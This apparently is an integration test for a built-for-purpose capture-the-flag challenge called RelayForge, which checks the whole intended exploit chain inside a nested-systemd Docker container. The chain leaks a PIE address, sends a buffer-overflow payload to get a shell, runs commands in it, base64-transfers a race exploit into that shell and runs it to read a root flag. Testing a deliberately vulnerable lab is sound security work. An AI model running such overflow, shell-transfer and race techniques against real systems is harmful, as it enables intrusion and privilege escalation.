#!/usr/bin/env python3
"""Run the real Supervisor/transient Worker chain under nested systemd.

The test container is deliberately privileged only so systemd can manage its
own cgroup namespace. No host directory is mounted writable. Nested systemd
must run on a native Docker architecture; emulated AMD64 PID 1 is unsupported.
"""

from __future__ import annotations

import base64
import json
import os
import secrets
import shlex
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "attacks"))
import full_chain as chain  # noqa: E402


IMAGE = "relayforge-systemd-integration:2.0.0"
PLATFORM = os.environ.get("RELAYFORGE_SYSTEMD_PLATFORM", "linux/amd64")


def normalized_architecture(value: str) -> str:
    return {"x86_64": "amd64", "aarch64": "arm64"}.get(value, value)


def docker(*arguments: str, timeout: float = 120, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", *arguments],
        cwd=ROOT,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
        check=check,
    )


def exec_in(name: str, *arguments: str, user: str | None = None, check: bool = True) -> subprocess.CompletedProcess[str]:
    command = ["exec"]
    if user is not None:
        command.extend(["--user", user])
    command.append(name)
    command.extend(arguments)
    return docker(*command, timeout=30, check=check)


def main() -> int:
    name = f"relayforge-systemd-{os.getpid()}-{secrets.token_hex(3)}"
    client: socket.socket | None = None
    try:
        docker_arch = normalized_architecture(
            docker("info", "--format", "{{.Architecture}}").stdout.strip()
        )
        requested_arch = normalized_architecture(PLATFORM.rsplit("/", 1)[-1])
        if docker_arch != requested_arch:
            print(
                "SKIP: nested systemd requires a native Docker architecture "
                f"(engine={docker_arch}, requested={requested_arch}); "
                "run tests/run-vm.sh on Ubuntu 24.04 AMD64"
            )
            return 0
        docker(
            "build",
            "--platform",
            PLATFORM,
            "-f",
            str(ROOT / "tests/systemd/Dockerfile"),
            "-t",
            IMAGE,
            str(ROOT),
            timeout=300,
        )
        docker(
            "run",
            "--detach",
            "--name",
            name,
            "--platform",
            PLATFORM,
            "--privileged",
            "--cgroupns=private",
            "--tmpfs",
            "/run",
            "--tmpfs",
            "/run/lock",
            "-p",
            "127.0.0.1::25000",
            IMAGE,
        )
        deadline = time.monotonic() + 45
        while time.monotonic() < deadline:
            status = exec_in(
                name,
                "systemctl",
                "is-active",
                "--quiet",
                "relay-supervisor.service",
                check=False,
            )
            backend = exec_in(
                name,
                "systemctl",
                "is-active",
                "--quiet",
                "relay-backend.service",
                check=False,
            )
            if status.returncode == 0 and backend.returncode == 0:
                break
            time.sleep(0.5)
        else:
            logs = docker("logs", name, check=False).stderr
            raise RuntimeError(f"nested systemd services did not start: {logs[-2000:]}")

        signed = json.loads(exec_in(name, "python3", "/test/sign_job.py").stdout)
        job_id = signed["job_id"]
        request_text = json.dumps(signed["request"], separators=(",", ":"))
        launched = json.loads(
            exec_in(
                name,
                "python3",
                "/test/launch_client.py",
                request_text,
                user="relay-dispatch",
            ).stdout
        )
        if launched.get("ok") is not True or launched.get("port") != 25000:
            raise RuntimeError(f"real Supervisor rejected signed launch: {launched}")
        token = launched.get("token")
        if not isinstance(token, str) or len(token) != 48:
            raise RuntimeError("Supervisor returned an invalid token")

        unit = f"relay-worker-{job_id}.service"
        exec_start = exec_in(name, "systemctl", "show", "--property=ExecStart", "--value", unit).stdout
        if token in exec_start or "profile=" in exec_start or "worker.conf" not in exec_start:
            raise RuntimeError(f"Worker argv leaks secrets/options: {exec_start}")
        properties = exec_in(
            name,
            "systemctl",
            "show",
            "--property=NoNewPrivileges,ProtectSystem,PrivateDevices,MemoryDenyWriteExecute,TasksMax,MemoryMax",
            unit,
        ).stdout
        for expected in ("NoNewPrivileges=yes", "ProtectSystem=strict", "PrivateDevices=yes", "MemoryDenyWriteExecute=yes"):
            if expected not in properties:
                raise RuntimeError(f"transient Worker lacks {expected}: {properties}")
        config_metadata = exec_in(
            name,
            "stat",
            "-c",
            "%U:%G:%a",
            f"/var/lib/relayforge/workers/{job_id}/worker.conf",
        ).stdout.strip()
        if config_metadata != "root:relayforge-ipc:440":
            raise RuntimeError(f"Worker config metadata is unsafe: {config_metadata}")

        probe_command = (
            f"printf x > /var/lib/relayforge/workers/{job_id}/work/probe.log; "
            f"python3 /test/launch_client.py '{json.dumps({'op': 'archive', 'job_id': job_id, 'name': 'probe.log'}, separators=(',', ':'))}'"
        )
        outside = exec_in(name, "/bin/sh", "-c", probe_command, user="relay").stdout
        outside_reply = json.loads(outside.splitlines()[-1])
        if outside_reply.get("ok") is not False:
            raise RuntimeError("relay process outside the Worker cgroup could archive")

        mapping = docker("port", name, "25000/tcp").stdout.strip()
        host_port = int(mapping.rsplit(":", 1)[1])
        with socket.create_connection(("127.0.0.1", host_port), timeout=5) as wrong:
            wrong.sendall(("TOKEN " + chain._wrong_token(token) + "\n").encode("ascii"))
            if chain._recv_line(wrong, 5) != b"ERR auth\n":
                raise RuntimeError("real Worker accepted wrong token")

        with socket.create_connection(("127.0.0.1", host_port), timeout=5) as tunnel:
            tunnel.sendall(("TOKEN " + token + "\n").encode("ascii"))
            tunnel_job = chain._banner_job(chain._recv_line(tunnel, 5))
            if tunnel_job != job_id:
                raise RuntimeError("real Worker tunnel banner did not match signed job")
            if chain._recv_line(tunnel, 5) != b"OK\n":
                raise RuntimeError("real Worker rejected valid tunnel token")
            tunnel.sendall(b"CONNECT\n")
            if chain._recv_line(tunnel, 5) != b"CONNECTED\n":
                raise RuntimeError("real Worker did not establish HTTP tunnel")
            tunnel.sendall(
                b"GET /health HTTP/1.1\r\n"
                b"Host: endpoint.test\r\n"
                b"Connection: close\r\n\r\n"
            )
            tunneled_response = chain._read_to_eof(tunnel, 5)
            if not tunneled_response.startswith(b"HTTP/1.1 200 OK\r\n") or \
               b"RelayForge HTTP endpoint healthy\n" not in tunneled_response:
                raise RuntimeError("real Worker tunnel did not relay the HTTP endpoint")

        with socket.create_connection(("127.0.0.1", host_port), timeout=5) as browser:
            browser.sendall(
                f"GET /relay/{token}/ HTTP/1.1\r\n".encode("ascii")
                + b"Host: relay.test\r\nConnection: close\r\n\r\n"
            )
            browser_response = chain._read_to_eof(browser, 5)
        if (
            not browser_response.startswith(b"HTTP/1.1 200 OK\r\n")
            or b"RelayForge endpoint reached" not in browser_response
        ):
            raise RuntimeError("real Worker browser URL did not relay the private endpoint")

        client = socket.create_connection(("127.0.0.1", host_port), timeout=5)
        client.sendall(("TOKEN " + token + "\n").encode("ascii"))
        banner_job = chain._banner_job(chain._recv_line(client, 5))
        if banner_job != job_id:
            raise RuntimeError("real Worker banner job did not match signed job")
        if chain._recv_line(client, 5) != b"OK\n":
            raise RuntimeError("real Worker rejected valid token")
        client.sendall(b"LEAK\n")
        leak = chain._recv_line(client, 5).decode("ascii").strip()
        match = chain.LEAK_RE.fullmatch(leak)
        if match is None:
            raise RuntimeError(f"real Worker did not leak PIE address: {leak}")
        exploit = b"A" * 128 + struct.pack("<Q", int(match.group(1), 16))
        client.sendall(f"OVERFLOW {len(exploit)}\n".encode("ascii") + exploit)
        if b"relay shell opened" not in chain._recv_line(client, 5):
            raise RuntimeError("real Worker callback overwrite failed")
        identity, identity_rc = chain._shell_capture(client, "id", 8)
        if identity_rc != 0 or chain.RELAY_ID_RE.search(identity) is None:
            raise RuntimeError(f"real Worker shell identity is wrong: {identity}")
        direct, direct_rc = chain._shell_capture(client, f"cat {chain.ROOT_FLAG_PATH} 2>&1", 8)
        if direct_rc == 0 or chain.FLAG_RE.search(direct):
            raise RuntimeError("relay shell directly read the root flag")

        race_source = (ROOT / "attacks/exploit_supervisor_race.py").read_bytes()
        encoded = base64.b64encode(race_source).decode("ascii")
        remote = "/tmp/relayforge-race.py"
        _, transfer_rc = chain._shell_capture(
            client,
            "printf %s " + shlex.quote(encoded) + " | base64 -d > " + remote,
            8,
        )
        if transfer_rc != 0:
            raise RuntimeError("could not transfer race helper into real Worker")
        race_output, race_rc = chain._shell_capture(client, f"python3 {remote} {job_id}", 20)
        flag = chain.FLAG_RE.search(race_output)
        if race_rc != 0 or flag is None:
            raise RuntimeError(f"real Supervisor race failed: rc={race_rc}, output={race_output}")
        if flag.group(0) != "RF{fedcba98765432100123456789abcdef}":
            raise RuntimeError("Supervisor race returned unexpected data")
    except (OSError, ValueError, KeyError, RuntimeError, subprocess.SubprocessError, chain.ChainError) as exc:
        print(f"FAIL: Supervisor/systemd integration: {exc}", file=sys.stderr)
        if 'name' in locals():
            diagnostics = docker("logs", name, check=False).stderr
            if diagnostics:
                print(diagnostics[-3000:], file=sys.stderr)
        return 1
    finally:
        if client is not None:
            client.close()
        docker("rm", "--force", name, check=False)
    print("PASS: real signed Supervisor→systemd Worker→relay shell→cgroup gate→TOCTOU flag chain")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
